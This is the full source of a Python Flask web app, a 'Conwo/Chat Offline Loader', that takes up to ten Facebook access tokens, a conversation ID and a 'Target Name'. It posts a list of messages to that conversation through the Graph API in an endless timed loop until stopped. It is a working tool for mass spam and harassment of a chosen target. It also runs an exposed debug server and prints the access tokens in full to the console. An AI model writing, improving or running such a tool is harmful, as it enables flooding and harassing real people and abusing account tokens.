from flask import Flask, request, render_template_string, jsonify, redirect, url_for
import requests
from threading import Thread, Event
import time

app = Flask(__name__)
app.debug = True

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8'
}

stop_events = {}
threads = {}

def send_messages(access_tokens, thread_id, mn, time_interval, messages, task_id):
    stop_event = stop_events[task_id]
    while not stop_event.is_set():
        for message1 in messages:
            if stop_event.is_set():
                break

            for access_token in access_tokens:
                api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                message = str(mn) + ' ' + message1
                parameters = {'access_token': access_token, 'message': message}
                response = requests.post(api_url, data=parameters, headers=headers)
                if response.status_code == 200:
                    print(f"\x1b[1;32mMessage Sent Successfully From token \x1b[1;105m{access_token}: \x1b[1;97m{message}")
                else:
                    print(f"\x1b[1;31mMessage Sent Failed From token \x1b[38;5;226m{access_token}: \x1b[38;5;44m{message}")
                time.sleep(time_interval)

@app.route('/', methods=['GET', 'POST'])
def send_message():
    if request.method == 'POST':
        num_tokens = int(request.form.get('numTokens'))

        # Check if number of tokens is greater than 10
        if num_tokens > 10:
            return "Error: You can't set the number of tokens to more than 10."

        access_tokens = [request.form.get(f'accessToken{i+1}') for i in range(num_tokens)]
        
        # Retrieve other form data
        thread_id = request.form.get('threadId')
        mn = request.form.get('kidx')
        time_interval = int(request.form.get('time'))

        # Multiline message input, expecting one message per line
        message_input = request.form.get('multiMessage')
        messages = [line.strip() for line in message_input.splitlines() if line.strip()]

        # Set task_id using kidx instead of thread_id
        task_id = mn.strip()  # Use kidx value for task_id
        
        # Set up stop event and thread for the task
        stop_events[task_id] = Event()
        thread = Thread(target=send_messages, args=(access_tokens, thread_id, mn, time_interval, messages, task_id))
        
        # Store and start the thread
        threads[task_id] = thread
        thread.start()

        # Render HTML view showing that message sending has started
        return render_template_string('''
        <html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Message Status</title>
    <style>
        body {
            font-family: Arial, sans-serif; /* Set a clean font */
            background-color: #f4f4f4; /* Light grey background */
            color: #333; /* Darker text for readability */
            margin: 0; /* Remove default margin */
            padding: 20px; /* Add padding around the content */
            display: flex; /* Use flexbox for centering */
            flex-direction: column; /* Arrange items vertically */
            align-items: center; /* Center items horizontally */
            justify-content: center; /* Center items vertically */
            height: 100vh; /* Full viewport height */
        }

        h2 {
            color: #2c3e50; /* Dark blue color for the heading */
            margin-bottom: 10px; /* Space below the heading */
        }

        p {
            font-size: 18px; /* Slightly larger text for paragraph */
            margin-bottom: 20px; /* Space below the paragraph */
        }

        a {
            text-decoration: none; /* Remove underline from link */
            color: #2980b9; /* Blue color for the link */
            font-weight: bold; /* Bold link text */
            padding: 10px 15px; /* Padding around the link */
            border: 2px solid #2980b9; /* Border to make the link stand out */
            border-radius: 5px; /* Rounded corners for the button-like appearance */
            transition: background-color 0.3s, color 0.3s; /* Smooth transition for hover effect */
        }

        a:hover {
            background-color: #2980b9; /* Blue background on hover */
            color: white; /* White text on hover */
        }
    </style>
</head>
<body>
    <h2>Message sending started.</h2>
    <p>Task ID: {{ task_id }}</p>
    <a href="{{ url_for('send_message') }}">Go back</a>
</body>
</html>
        ''', task_id=task_id)

    return render_template_string('''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Conservation Offline Loader Setup</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        /* General Reset */
        body, html {
            margin: 0;
            padding: 0;
            font-family: Arial, sans-serif;
            background-color: #f8f9fa;
            color: #333;
        }

        /* Header Styling */
        header {
            background-color: #2874f0;
            color: white;
            padding: 20px;
            text-align: center;
        }
        .header h1 {
            font-size: 1.8rem;
            margin: 0;
        }

        /* Container Styling */
 .container {
                  background: Wight ;
            border: 1px solid #ddd;
            border-radius: 10px;
            width: auto;
            margin: 30px;
            padding: 20px;
            text-align: center;
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
            box-shadow: 0 0 15px black;
            font-weight: bold;
        }

 /* Form Headings */
        .container h2 {
            font-size: 1.5rem;
            margin-bottom: 1.5rem;
            font-weight: bold;
            color: #007bff;
        }

        /* Form Field Styling */
        .form-label {
            font-weight: bold;
            color: #555;
        }
        .form-control {
            outline: 2px red;
            border: 4px double blue;
            background: transparent;
            height: 41px;
            padding: 6px;
            margin-bottom: 20px;
            border-radius: 20px;
            color: red;
        }
        .form-product {
            background: white;
            outline: 2px red;
            border: 4px double green;
            border-radius: 55px;
            width: 100%;
            margin: 5px 0;
            padding: 10px;
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
        }
        .form-control:focus, .form-product:focus {
            border-color: #007bff;
            box-shadow: 0 0 0 0.2rem rgba(0, 123, 255, 0.25);
        }

        /* Button Styling */
        .btn {
            border-radius: 0.3rem;
            padding: 0.6rem 1.25rem;
            font-size: 1rem;
            font-weight: bold;
            text-transform: uppercase;
            transition: background-color 0.3s ease, box-shadow 0.3s ease;
        }
        .btn-primary {
            background-color: #007bff;
            border: none;
        }
        .btn-primary:hover {
            background-color: #0056b3;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
        }
        .btn-danger {
            background-color: #dc3545;
            border: none;
        }
        .btn-danger:hover {
            background-color: #c82333;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
        }

        /* Token Status Styling */
        .token-status {
            margin-top: 5px;
        }
/* Token-specific styles */
.token-container {
    background: rgba(230, 240, 255, 0.8); /* Light background for token input area */
    padding: 10px;
    border: 1px dashed #007bff; /* Dashed border for visual separation */
    border-radius: 10px;
    margin-bottom: 20px;
}
        /* Footer Styling */
        .footer {
            background-color: #333;
            color: #fff;
            text-align: center;
            padding: 20px;
            font-weight: bold;
        }
        .footer p {
            margin: 5px 0;
            font-size: 16px;
        }

        /* Social Links Styling */
        .facebook-link, .whatsapp-link {
            display: inline-block;
            padding: 10px 22px;
            border-radius: 8px;
            color: white;
            margin: 4px;
            text-decoration: none;
            font-weight: bold;
        }
        .facebook-link {
            background-color: #4267B2;
        }
        .whatsapp-link {
            background-color: #25D366;
        }
    </style>
    <script>
        function showAlert(message) {
            alert(message);
        }
    
        };
    </script>
</head>
<body>
    <header class="header mt-3">
        <h1>Conwo/Chat Offline Loader Setup</h1>
    </header>

    <div class="container">
        <h1>◉ Submit Details ◉</h1>
        <form method="POST" onsubmit="return validateTokens()">
            <div class="mb-3 token-container">
    <label for="numTokens" class="form-label">Number of Tokens (Maximum-10):</label>
    <input type="number" class="form-control" name="numTokens" id="numTokens" min="1" max="10" value="1 To 10" required onchange="generateTokenFields()">
</div>

            <div id="tokenFields"></div>
            <hr> <!-- Add horizontal line here -->

            <div class="mb-3">
                <label for="threadId" class="form-label">Conservation ID:</label>
                <input type="text" class="form-control" name="threadId" id="threadId" required>
            </div>

            <div class="mb-3">
                <label for="kidx" class="form-label"> Target Name:</label>
                <input type="text" class="form-control" name="kidx" id="kidx" required>
            </div>      

            <div class="mb-3">
                <label for="multiMessage" class="form-label">Messages (one per line):</label>
                <textarea class="form-product" name="multiMessage" id="multiMessage" required></textarea>
            </div>

            <div class="mb-3">
                <label for="time" class="form-label">Message Speed (seconds):</label>
                <input type="number" class="form-control" name="time" id="time" required>
            </div>

            <button type="submit" class="btn btn-primary">Start Loader</button>
            <hr> <!-- Add horizontal line here -->
            
            
        </form>
<h> ◉ ◉ ◉ ◉ ◉     <h>
      <form action="{{ url_for('stop_task') }}" method="POST" onsubmit="return confirmStopTask()">
        <div class="mb-3">
            <label for="taskId" class="form-label">Section: 2</label>
            <input type="text" class="form-control" name="taskId" id="taskId" required placeholder="Enter Task ID to Stop Loader">
        </div>
        
        <button type="submit" class="btn btn-danger">Stop Task</button>
    </form>
            </div> <!-- Close the container -->
         <footer class="footer">
        <p>©2025 Conservation Loader Setup</p>
        <p>◉ All Rights Reserved ◉</p>
        <p>Developer: @Raghav Choudhary</p>
        <p><a href="https://www.facebook.com/100021548077876" class="facebook-link">Chat on Messenger</a></p>
        <p><a href="https://wa.me/+919351042631" class="whatsapp-link">Chat on WhatsApp</a></p>
    </footer>

    <script>
        function generateTokenFields() {
            var numTokens = document.getElementById('numTokens').value;
            var tokenFields = document.getElementById('tokenFields');
            tokenFields.innerHTML = '';
            for (var i = 0; i < numTokens; i++) {
                var fieldHtml = `
                    <div class="mb-3">
                        <label for="accessToken${i+1}" class="form-label">Enter Token ${i+1}:</label>
                        <input type="text" class="form-product" name="accessToken${i+1}" id="accessToken${i+1}" required>
                        <button type="button" onclick="checkToken(${i+1})" class="btn btn-secondary mt-2">Check Token</button>
                        <div id="tokenStatus${i+1}" class="token-status"></div>
                    </div>
                `;
                tokenFields.insertAdjacentHTML('beforeend', fieldHtml);
            }
        }

        function validateTokens() {
            var numTokens = document.getElementById('numTokens').value;
            if (numTokens > 10) {
                alert("You can't set the number of tokens to more than 10.");
                return false;
            }
            return true;
        }

        

        function checkToken(index) {
            var token = document.getElementById(`accessToken${index}`).value;
            fetch(`/check_token?access_token=${token}`)
                .then(response => response.json())
                .then(data => {
                    var statusDiv = document.getElementById(`tokenStatus${index}`);
                    if (data.success) {
                        statusDiv.innerHTML = `<span style="color: green;">Token Active: ${data.name}</span>`;
                    } else {
                        statusDiv.innerHTML = `<span style="color: red;">Invalid token</span>`;
                    }
                })
                .catch(error => {
                    var statusDiv = document.getElementById(`tokenStatus${index}`);
                    statusDiv.innerHTML = `<span style="color: red;">Error checking token</span>`;
                });
        }
    </script>
</body>
</html>
    ''', stop_events=stop_events)

@app.route('/check_token', methods=['GET'])
def check_token():
    access_token = request.args.get('access_token')
    url = f'https://graph.facebook.com/me?access_token={access_token}'
    try:
        response = requests.get(url, headers=headers)
        if response.status_code == 200:
            data = response.json()
            return jsonify(success=True, name=data['name'])
        else:
            return jsonify(success=False)
    except requests.RequestException:
        return jsonify(success=False)

@app.route('/stop', methods=['POST'])
def stop_task():
    task_id = request.form.get('taskId')
    if task_id in stop_events:
        stop_events[task_id].set()  # Stop the task by setting the event
        stop_events.pop(task_id)    # Remove the task from stop_events
        threads.pop(task_id, None)  # Remove the task from threads if it exists

        # Render HTML view showing that the task has been stopped
        return render_template_string('''
        <!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Task Stopped</title>
    <style>
        body {
            font-family: Arial, sans-serif; /* Clean font for readability */
            background-color: #f2f2f2; /* Light grey background */
            color: #333; /* Dark text color for contrast */
            margin: 0; /* Remove default margin */
            padding: 20px; /* Add padding around the content */
            display: flex; /* Use flexbox for centering */
            flex-direction: column; /* Arrange items vertically */
            align-items: center; /* Center items horizontally */
            justify-content: center; /* Center items vertically */
            height: 100vh; /* Full viewport height */
        }

        h2 {
            color: #e74c3c; /* Red color to indicate an alert */
            margin-bottom: 10px; /* Space below the heading */
        }

        p {
            font-size: 18px; /* Larger font for the paragraph */
            margin-bottom: 20px; /* Space below the paragraph */
        }

        a {
            text-decoration: none; /* Remove underline from link */
            color: #3498db; /* Blue color for the link */
            font-weight: bold; /* Bold link text */
            padding: 10px 15px; /* Padding around the link */
            border: 2px solid #3498db; /* Border to make the link stand out */
            border-radius: 5px; /* Rounded corners for button-like appearance */
            transition: background-color 0.3s, color 0.3s; /* Smooth transition for hover effect */
        }

        a:hover {
            background-color: #3498db; /* Blue background on hover */
            color: white; /* White text on hover */
        }
    </style>
</head>
<body>
    <h2>Task has been stopped.</h2>
    <p>Task ID: {{ task_id }}</p>
    <a href="{{ url_for('send_message') }}">Go back</a>
</body>
</html>
        ''', task_id=task_id)
    else:
        return "No task found with this ID."
        

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=21483)
    